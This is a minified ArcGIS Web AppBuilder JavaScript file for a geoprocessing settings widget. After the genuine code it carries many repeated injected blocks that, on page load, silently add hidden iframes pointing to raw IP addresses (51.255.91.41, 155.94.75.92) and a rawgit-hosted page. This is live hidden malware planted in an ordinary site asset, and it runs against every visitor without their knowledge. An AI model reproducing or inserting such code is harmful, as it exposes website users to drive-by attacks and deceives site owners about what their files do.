// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/setting/Options.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"field"\x3e\r\n    \x3clabel class\x3d"option-help-label"\x3e${nls.helpUrl}:\x3c/label\x3e\x3cinput data-dojo-type\x3d"dijit/form/TextBox" data-dojo-attach-point\x3d"helpUrl" class\x3d"option-help-url"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"field"\x3e\r\n    \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"useResultMapServer"\x3e\x3c/div\x3e\x3clabel class\x3d"jimu-leading-margin05 jimu-ellipsis" title\x3d"${nls.useResultMapService}"\x3e${nls.useResultMapService}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"field"\x3e\r\n    \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"shareResults"\x3e\x3c/div\x3e\x3clabel class\x3d"jimu-leading-margin05 jimu-ellipsis" title\x3d"${nls.shareResults}"\x3e${nls.shareResults}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"field"\x3e\r\n    \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"showExport"\x3e\x3c/div\x3e\x3clabel class\x3d"jimu-leading-margin05 jimu-ellipsis" title\x3d"${nls.allowToExport}"\x3e${nls.allowToExport}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/text!./Options.html dojo/_base/lang dojo/Evented dojo/on dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin ../utils dijit/form/TextBox jimu/dijit/CheckBox".split(" "),function(b,c,d,e,f,g,h,k,l){return b([g,h,k,e],{baseClass:"jimu-widget-setting-gp-options",templateString:c,setConfig:function(a){this.config=a;this.helpUrl.setValue(a.helpUrl);l.allowShareResult(a)?(this.shareResults.setStatus(!0),this.shareResults.setValue(!!a.shareResults)):(this.shareResults.setValue(!1),
this.shareResults.setStatus(!1));a.serverInfo.hasResultMapServer?(this.useResultMapServer.setStatus(!0),this.useResultMapServer.setValue(!!a.useResultMapServer),this.setUserResultMapServer(this.useResultMapServer.getValue()),this.own(f(this.useResultMapServer,"change",d.hitch(this,function(a){this.setUserResultMapServer(a);this.emit("result-map-service",a)})))):(this.useResultMapServer.setValue(!1),this.useResultMapServer.setStatus(!1));this.showExport.setValue(!!a.showExportButton)},setUserResultMapServer:function(a){a?
(this.shareResults.setValue(!0),this.shareResults.setStatus(!1)):this.shareResults.setStatus(!0)},acceptValue:function(){this.config&&(this.config.helpUrl=this.helpUrl.getValue(),this.useResultMapServer.status&&(this.config.useResultMapServer=this.useResultMapServer.getValue()),this.config.shareResults=this.shareResults.getValue(),this.config.showExportButton=this.showExport.getValue())}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});